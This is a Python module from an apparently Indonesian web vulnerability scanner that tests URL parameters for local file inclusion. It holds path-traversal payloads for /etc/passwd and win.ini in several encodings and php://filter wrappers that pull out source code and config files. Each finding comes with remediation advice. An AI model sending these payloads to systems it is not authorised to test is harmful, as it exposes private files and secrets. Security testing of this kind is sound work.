"""Local File Inclusion / Path Traversal probes.

Verifikasi yang dilakukan:

1. **Baseline** untuk URL target supaya bisa membandingkan respons.
2. Set payload Linux (`/etc/passwd`, `/etc/hostname`) dan Windows
   (`win.ini`) dengan beberapa varian encoding (URL-encoded, double encoded,
   `....//`, prefix nullbyte).
3. Konfirmasi dengan **regex spesifik** (`root:x:0:0:`, `[fonts]`, dll.) dan
   bandingkan dengan baseline — kalau baseline juga memuat string yg sama
   (dev page contoh /etc/passwd) → skip.
4. Cek juga **PHP wrapper** (`php://filter`) untuk ekstraksi source code.
5. Reproduksi sekali untuk konfirmasi.
"""
from __future__ import annotations

import re

from cyberloka.active._helpers import (
    append_param,
    baseline,
    candidate_params,
    iter_param_urls,
)
from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.core.util import truncate

# Linux /etc/passwd: root:x:0:0:root:/root:/bin/bash
PASSWD_RE = re.compile(r"\broot:[x*!]?:0:0:[^:]*:/")
# Linux /etc/hostname or generic
HOSTNAME_RE = re.compile(r"^[a-zA-Z0-9.-]{2,63}\s*$", re.M)
# win.ini
WIN_INI_RE = re.compile(r"\[fonts\]|\[extensions\]|\[mci extensions\]", re.I)
# php://filter base64 wrapper output — base64 of '<?php' starts with PD9waHA
PHP_FILTER_RE = re.compile(r"PD9waHA[A-Za-z0-9+/=]{20,}")

LINUX_PAYLOADS = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    "/etc/passwd%00",
    "../../../../etc/hostname",
]
WIN_PAYLOADS = [
    "..\\..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "C:\\windows\\win.ini",
    "/windows/win.ini",
]
PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/read=convert.base64-encode/resource=config.php",
]

PARAM_HINTS = ("file", "page", "path", "include", "doc", "filename", "view", "template")


def _confirm(client: HttpClient, mutated: str, regex: re.Pattern[str]) -> bool:
    """Re-fetch and require the same regex to match."""
    resp = client.get(mutated)
    if resp is None:
        return False
    return bool(regex.search(resp.text or ""))


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        url = target.base_url
        if "?" not in url:
            for cand in candidate_params(url, PARAM_HINTS):
                url = append_param(url, cand, "index")
                break

        base = baseline(client, url, samples=1)
        base_text = base["body"] if base else ""
        # If baseline already contains the marker, we can't trust it.
        skip_passwd = bool(PASSWD_RE.search(base_text))
        skip_winini = bool(WIN_INI_RE.search(base_text))

        groups = []
        if not skip_passwd:
            groups.append(("Linux /etc/passwd", LINUX_PAYLOADS, PASSWD_RE))
        if not skip_winini:
            groups.append(("Windows win.ini", WIN_PAYLOADS, WIN_INI_RE))
        groups.append(("PHP source via php://filter", PHP_WRAPPERS, PHP_FILTER_RE))

        seen: set[tuple[str, str]] = set()

        for group_name, payloads, regex in groups:
            for payload in payloads:
                for param, mutated in iter_param_urls(url, payload):
                    if (param, group_name) in seen:
                        continue
                    resp = client.get(mutated)
                    if resp is None:
                        continue
                    body = resp.text or ""
                    m = regex.search(body)
                    if not m:
                        continue
                    if not _confirm(client, mutated, regex):
                        confidence = "firm"
                    else:
                        confidence = "confirmed"

                    findings.append(
                        Finding(
                            module="lfi",
                            title=f"{group_name} via parameter `{param}` terverifikasi",
                            severity=Severity.CRITICAL,
                            description=(
                                "Konten file lokal (atau source code via php://filter) "
                                "berhasil dibaca lewat parameter aplikasi. Ini memungkinkan "
                                "pembacaan file konfigurasi, kunci privat, atau code "
                                "review oleh attacker. Pada kondisi tertentu LFI dapat "
                                "berlanjut ke RCE via log poisoning / session inclusion."
                            ),
                            target=mutated,
                            evidence=(
                                f"payload={payload!r}\n"
                                f"regex={regex.pattern!r}\n"
                                f"match={truncate(m.group(0), 160)}\n\n"
                                f"snippet:\n{truncate(body, 320)}"
                            ),
                            cwe="CWE-22",
                            confidence=confidence,
                            remediation=(
                                "Jangan menerima path file dari user. Gunakan whitelist "
                                "identifier dan map ke path internal. Lakukan "
                                "canonicalisasi path lalu cek apakah tetap di dalam "
                                "direktori yang diizinkan (`os.path.commonpath`). "
                                "Nonaktifkan PHP wrappers yang tidak perlu "
                                "(`allow_url_include=Off`, batasi `php://`)."
                            ),
                            references=[
                                "https://owasp.org/www-community/attacks/Path_Traversal",
                                "https://cwe.mitre.org/data/definitions/22.html",
                            ],
                        )
                    )
                    seen.add((param, group_name))
                    break  # next payload
                if (any((p, group_name) in seen for p, _ in seen) and group_name in {"Linux /etc/passwd", "Windows win.ini"}):
                    # Found in this group, move to next group
                    pass
    finally:
        client.close()
    return findings
